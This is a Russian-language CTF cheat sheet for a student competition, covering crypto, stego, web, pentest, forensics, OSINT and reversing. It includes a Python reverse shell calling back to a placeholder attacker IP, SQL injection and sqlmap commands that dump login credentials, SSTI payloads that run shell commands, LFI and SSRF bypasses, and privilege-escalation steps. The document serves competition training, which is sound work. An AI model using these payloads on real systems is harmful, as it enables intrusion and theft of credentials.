CTF Шпаргалка · Кибербитва

Собрано по категориям заданий ПРО Кибербез Уфа. Ищи по Ctrl+F.

Как работать: распознать класс задачи → взять готовый приём отсюда → применить. Payload'ы не зубрят, их подсматривают.
Формат флага: flag{...} или kiberbitva{...} — уточни у организаторов на старте.
Открой в закладках: HackTricks (book.hacktricks.xyz), PayloadsAllTheThings (github.com/swisskyrepo/PayloadsAllTheThings), CyberChef (gchq.github.io/CyberChef).
Тактика: бери задачи от дешёвых к дорогим, не залипай на одной больше 30–40 минут. Команда до 3 человек — раздели: web+crypto / forensics+SIEM / пентест.
Внимание, система: команды ниже (file, strings, binwalk, steghide, grep) — это Linux. На чистой Windows их нет. Решение — поставить Linux внутрь Windows (WSL):
1. PowerShell от администратора: wsl --install → перезагрузка → задать логин/пароль.
2. Установить инструменты: sudo apt update && sudo apt install file binwalk steghide exiftool john -y
3. Свои файлы с диска D видно по пути /mnt/d/...
После этого все команды из шпаргалки работают как написано. Что не требует Linux: CyberChef (в браузере), pylingual.io, Python-скрипты (Python есть и на Windows).

Крипто CTF

Простые задачи, быстрые очки. Бери первыми.

Любую непонятную строку сначала в CyberChef → кнопка «Magic» — он сам определит кодировку. Не помогло — вручную:

echo 'строка' | base64 -d          # base64: буквы+цифры+/, часто '=' в конце
echo '48656c6c6f' | xxd -r -p      # hex: только 0-9 a-f
  • Цезарь / ROT — перебор 25 сдвигов, в CyberChef «ROT13 Brute Force».
  • Морзе (.- -...) — CyberChef «From Morse Code».
  • Бинарная морзе (нолики-единички) — сначала биты → точки/тире, потом → текст.
  • Yoptascript / JSFuck (код из []()!+) — вставь в консоль браузера (F12), выполнится сам.
  • Хэши файлов — тип по длине (32=MD5, 40=SHA1), пробей на crackstation.net или john.

Неизвестная кодировка (кракозябры типа ÃãÆÀÉ£¢)

Признак: длина «мусора» = длине ожидаемого текста → это не тот charset, а не шифр. Символы вроде Ã Æ ¢ = текст сохранён в UTF-8, прочитан иначе. Не гадай кодировку — перебери все скриптом:

data = open("файл.txt","rb").read().rstrip()
inner = data.decode("utf-8").encode("latin1")   # снять внешний UTF-8-слой
import encodings, pkgutil
for name in set(m.name for m in pkgutil.iter_modules(encodings.__path__)):
    try:
        t = inner.decode(name)
        if "CTF" in t or "flag" in t.lower() or "{" in t:
            print(name, "->", t)
    except: pass

Выведет читаемое, напр. cp037 -> CTF{...} (cp037 = EBCDIC). В CyberChef то же: Magic, либо вручную «Encode text → ISO-8859-1», затем «Decode text → IBM EBCDIC (500)».

Стего CTF

С ЛЮБОГО файла начинай с базовой проверки — часто этого хватает:

file имя                    # что это на самом деле (тип)
strings имя | grep -i flag  # текст/флаг прямо внутри
binwalk -e имя              # вытащить вложенные файлы
exiftool имя                # метаданные (для фото/видео) — иногда флаг или GPS

Фото / картинки (.png .jpg)

  • steghide extract -sf имя.jpg — достать данные из jpg (пароль часто пустой). Пароль неизвестен → stegseek имя.jpg rockyou.txt.
  • zsteg имя.png — младшие биты (LSB) в PNG.
  • Цветовые слои и биты — StegOnline (georgeom.net/StegOnline) или CyberChef. Флаг часто виден, если «покрутить» каналы/яркость.
  • Текст мог быть подрисован — просто открой и разгляди на разном зуме/контрасте.

Аудио (.wav .mp3)

  • Спектрограмма — приём №1. Флаг часто «нарисован» в частотах внизу. Три способа: Audacity (клик по названию дорожки → «Спектрограмма»), онлайн (academo.org/demos/spectrum-analyzer), или Python-скриптом без установки редактора (нужны python3-numpy python3-scipy python3-matplotlib):
python3 -c "import matplotlib;matplotlib.use('Agg');import matplotlib.pyplot as plt;from scipy.io import wavfile;sr,d=wavfile.read('имя.wav');d=d[:,0] if d.ndim>1 else d;plt.specgram(d,Fs=sr,NFFT=1024,noverlap=768,cmap='inferno');plt.tight_layout();plt.savefig('spec.png',dpi=120)"
explorer.exe spec.png   # открыть картинку из WSL в Windows
  • Послушать: голос диктует флаг, или Морзе (писки — раскодируй по длине), или DTMF (тоны кнопок телефона — онлайн-декодер DTMF).
  • Покрутить звук в Audacity: реверс (задом наперёд), замедление — скрытое иногда слышно/видно только так.
  • LSB в отсчётах: pip install stego-lsb → stegolsb wavsteg -r -i имя.wav -o out.txt -n 1.

Видео (.mp4 .avi)

  • Флаг в кадре — разложи на кадры: ffmpeg -i имя.mp4 frames/%04d.png, пролистай (иногда флаг мелькает 1 кадр).
  • Флаг в звуке — вытащи аудио и смотри спектрограмму: ffmpeg -i имя.mp4 -vn audio.wav, дальше как «Аудио» выше.
  • Вложенное/дописанное — binwalk -e имя.mp4, strings; метаданные — exiftool.

Текстовое стего (.txt, обычный текст)

Проверяй по порядку: (1) невидимые символы нулевой ширины — 330k.github.io/steganography; (2) кодирование в пробелах/табах в конце строк — cat -A файл (таб = ^I, конец строки = $); (3) чужие символы среди кириллицы — латинские буквы-двойники. Вытащить их скриптом:

python3 -c "print(''.join(c for c in open('файл.txt',encoding='utf-8').read() if c.isascii() and c.isalnum()))"

Оставит только не-кириллические буквы/цифры по порядку — они складываются в сообщение или флаг. Намёк: цифра или латинская буква вместо русской (напр. «Войн4»).

Пробелы/табы = бинарный код (часто в .docx)

Если под текстом строка из пробелов и табуляций — это двоичный код: пробел = 0, таб = 1. Бьёшь по 8 бит → ASCII. Для .docx сначала ставишь python3-docx (или pip install python-docx --break-system-packages), потом:

python3 -c "
from docx import Document
d=Document('файл.docx')
ws=''.join(p.text for p in d.paragraphs if p.text and all(c in ' \t' for c in p.text))
bits=''.join('1' if c=='\t' else '0' for c in ws)
print(''.join(chr(int(bits[i:i+8],2)) for i in range(0,len(bits)-7,8)))
"

Важно: берёшь только строку ЦЕЛИКОМ из пробелов/табов (условие all(...)), иначе пробелы между словами всё испортят. Намёк в условии обычно «смотри не на текст, а вокруг».

Веб CTF

Сначала всегда: исходник (Ctrl+U), куки (F12 → Application), /robots.txt, комментарии в коде, скрытые эндпоинты.

SSTI (ввод в шаблон):  {{7*7}}   # вернёт 49 → уязвимо, дальше payload под движок
LFI (?file=, ?page=):  ../../../../etc/passwd

SQL-инъекция (полностью)

А. Обойти форму входа. В поле «логин» вводишь ' OR '1'='1'-- -, пароль любой. Запрос превращается в «…WHERE login='' OR '1'='1' -- …»: условие всегда истинно, а -- отрезает проверку пароля → входишь первым пользователем.

Б. Вытащить данные через параметр в ссылке (напр. ?id=1):

?id=1'                       # 1) ошибка базы → инъекция есть
?id=1 ORDER BY 1-- -         # 2) увеличивай число до ошибки = число столбцов
?id=-1 UNION SELECT 1,2,3-- -    # 3) на странице проступит № видимого столбца
?id=-1 UNION SELECT 1,database(),3-- -                # 4) имя базы
?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -   # таблицы
?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -   # логины:пароли

В. Автоматом (sqlmap) — когда инъекция подтвердилась:

sqlmap -u "http://site/p.php?id=1" --batch --dbs            # базы
sqlmap -u "http://site/p.php?id=1" --batch -D база --tables  # таблицы
sqlmap -u "http://site/p.php?id=1" --batch -D база -T users --dump  # выгрузить

SSTI — эксплуатация (Jinja2 / Flask)

После подтверждения {{7*7}}=49 — чтение файла через цепочку до os (копируется из HackTricks «SSTI»):

{{ cycler.__init__.__globals__.os.popen('find / -name "flag*" 2>/dev/null').read() }}
{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}

SSRF (?url=, сервер сам ходит по ссылке)

Флаг за фильтром «только localhost» — обход альтернативной записью 127.0.0.1:

http://127.1/flag          http://2130706433/flag
http://0x7f000001/flag     http://[::ffff:127.0.0.1]/flag

Прочее

  • Обход авторизации — дефолты admin/admin, кука role=user→admin, JWT с alg:none.
  • Скрытые страницы/файлы — gobuster dir -u http://цель -w common.txt.
  • Готовая CVE (openfire, версия в заголовках) — гуглишь «продукт версия exploit».

Пентест RED

Ты взломщик. Цель: пробраться в чужой комп и забрать флаг. Суть: какие двери открыты → где дыра → получить командную строку (шелл) → дорасти до root → прочитать флаг.

1. Разведка портов

nmap -sC -sV -p- <ip>   # все открытые порты и что за ними за программы

2. По каждому открытому порту — что пробовать

  • 21 FTP — анонимный вход: ftp <ip>, логин anonymous, пароль любой → ls, get файл.
  • 22 SSH — нужны креды: ssh user@<ip>. Ломается только найденными паролями.
  • 80/443/8080 веб — главный вход. Браузер + gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt. Ищи SQLi, загрузку файлов, LFI, дефолт admin/admin (см. раздел Веб и SQL ниже).
  • 139/445 SMB — smbclient -L //<ip>/ и enum4linux -a <ip> (папки и юзеры, часто без пароля).
  • 3306/5432/1433 БД — вход дефолт/найденными кредами: mysql -h <ip> -u root -p.
  • 3389 RDP — xfreerdp /u:юзер /p:пароль /v:<ip>.
  • 6379 Redis — часто без пароля: redis-cli -h <ip> → keys *.
  • 111/2049 NFS — showmount -e <ip> (что примонтировать).
  • Незнакомый порт → гугли «<номер> enumeration hacktricks», там точные шаги. Версию из nmap → searchsploit <продукт версия>.

3. Получить шелл (командную строку на их машине)

Reverse-shell: у себя запускаешь приёмник nc -lvnp 4444, на жертве выполняешь строку — она подключается обратно к тебе:

python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ТВОЙ_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

Стабилизировать шелл: python3 -c 'import pty;pty.spawn("/bin/bash")'

4. Повышение прав до root (privesc)

whoami; id                       # кто я сейчас
sudo -l                          # что разрешено запускать от root
find / -perm -4000 2>/dev/null   # SUID-программы → путь к root
getcap -r / 2>/dev/null          # спец-привилегии

Проще всего — залить и запустить linpeas.sh, он сам подсветит вектор. Способ подъёма смотри на gtfobins.github.io. Побег из docker — ищи .dockerenv, примонтированный docker-сокет.

5. Забрать флаг

find / -name "*flag*" 2>/dev/null
cat /root/flag.txt   # типичные места: /root/flag.txt, /home/*/user.txt

Форензика и логи BLUE

Ты следователь. Атака уже произошла — тебе дали логи/трафик, найди следы и ответь на вопрос (IP атакующего, имя вируса, адрес C2). Суть: что дали → что спрашивают → grep по логам или Follow Stream в трафике → аномалия = ответ.

Логи входов Linux (/var/log/auth.log)

grep -iE "Failed|Accepted" auth.log  # вал Failed с одного IP → потом Accepted = подобрали пароль, это и есть атакующий
grep -i sudo auth.log                # попытки повышения прав

Логи веб-сервера (access.log)

grep -iE "union|select|\.\./|cmd=|<script" access.log  # следы SQLi, LFI, RCE, XSS

Странный User-Agent (sqlmap, nikto, gobuster) = автоматический инструмент атакующего. Код 200 на /admin = получил доступ.

Трафик (.pcap) — Wireshark

В строке фильтра сверху вводишь и жмёшь Enter:

  • http.request — все запросы к сайтам. Правый клик на строке → Follow → HTTP Stream — вся переписка целиком.
  • Меню File → Export Objects → HTTP — вытащит скачанные по сети файлы (так находишь вирус).
  • dns — к каким доменам обращались. C2 (сервер управления вирусом) виден как повторные запросы к одному адресу через равные промежутки («маячок», beaconing).
  • ip.addr==<адрес> — отфильтровать по конкретному узлу; ftp, telnet — часто пароли открытым текстом.

Windows-события (.evtx)

Открой в Event Viewer или прогони через Chainsaw. Ключевые Event ID: 4625 неудачный вход (много = брутфорс), 4624 успешный вход, 4688 запуск процесса, 4720 создан пользователь.

Вредоносный код

  • PowerShell (длинная строка после -enc) — в CyberChef рецепт «From Base64 → Gunzip» покажет настоящую команду.
  • Макрос в Office — olevba файл.docm.

OSINT CTF

Лёгкие, но времязатратные. Часто — геолокация по фото.

  • Фото — сначала exiftool фото.jpg (GPS бывает прямо в метаданных).
  • Место по картинке — обратный поиск в Яндексе (для РФ сильнее Google), сопоставление зданий через Яндекс.Карты и панорамы.
  • Ник — sherlock (github.com/sherlock-project) или whatsmyname.app.
  • Человек — соцсети, кэш поисковиков.
  • Символы /// — это what3words.com (каждый квадрат 3×3 м = 3 слова). Три слова → сайт → координаты → на карту (Google Earth / Яндекс.Карты).
  • OSINT — это цепочка. Один ответ ведёт к следующему: координаты → подпись на карте → Telegram-канал → ссылка на Яндекс.Диск → флаг. Иди по звеньям, не бросай на середине.

Misc / головоломки CTF

  • Ответ часто в самом условии и названии. В misc-задачах текст и заголовок — это подсказки, а не «вода». Каждую деталь истории воспринимай как ключ (пример с отбора: «не выключай» = reset, «бубнил в джойстик» = микрофон контроллера).
  • Книжный шифр. Если дан текст и набор чисел — числа это позиции: строка→абзац/предложение, число→номер слова или буквы. Собираешь по индексам → получается сообщение.
  • Игровой файл (.nes, .gb, ром) — открывай в эмуляторе (Mesen для NES), решение бывает внутри самой игры/механики.
  • Не спеши реверсить/спрашивать ИИ — авторы прячут фальшивые флаги для тех, кто лезет напролом. Сначала подумай над условием.

Реверс CTF

Первым делом всегда: file имя (что это) и strings имя | grep -i flag (флаг часто лежит строкой).

Python .exe (PyInstaller) — самый частый случай

Признак: .exe на 10–80 МБ; внутри strings видно PYZ, pythonXXX.dll. Разбор:

pip install pyinstxtractor-ng
pyinstxtractor-ng program.exe      # → папка program.exe_extracted

В папке найди main.pyc (в выводе он помечен «Possible entry point»). Дальше декомпилируй его в читаемый Python:

  • Свежий Python (3.11–3.13) — онлайн pylingual.io (загрузи main.pyc).
  • Старый Python (≤3.9) — uncompyle6 main.pyc или decompyle3.

В коде ищи flag. Если флага в коде нет (бывает троллинг «флаг не здесь») — смотри, что программа делает: раскодируй вшитые base64-данные, проверь картинки/видео/звук, которые она использует.

Прочие бинарники

  • .pyc отдельным файлом — сразу на pylingual.io (или uncompyle6 для старых версий).
  • Нативный .exe/.elf — Ghidra (декомпиляция в псевдо-C), ищешь функцию проверки флага; для запуска и просмотра — отладчик gdb+pwndbg.
  • JS/Python-скрипт — читай логику проверки и восстанавливай нужный ввод.
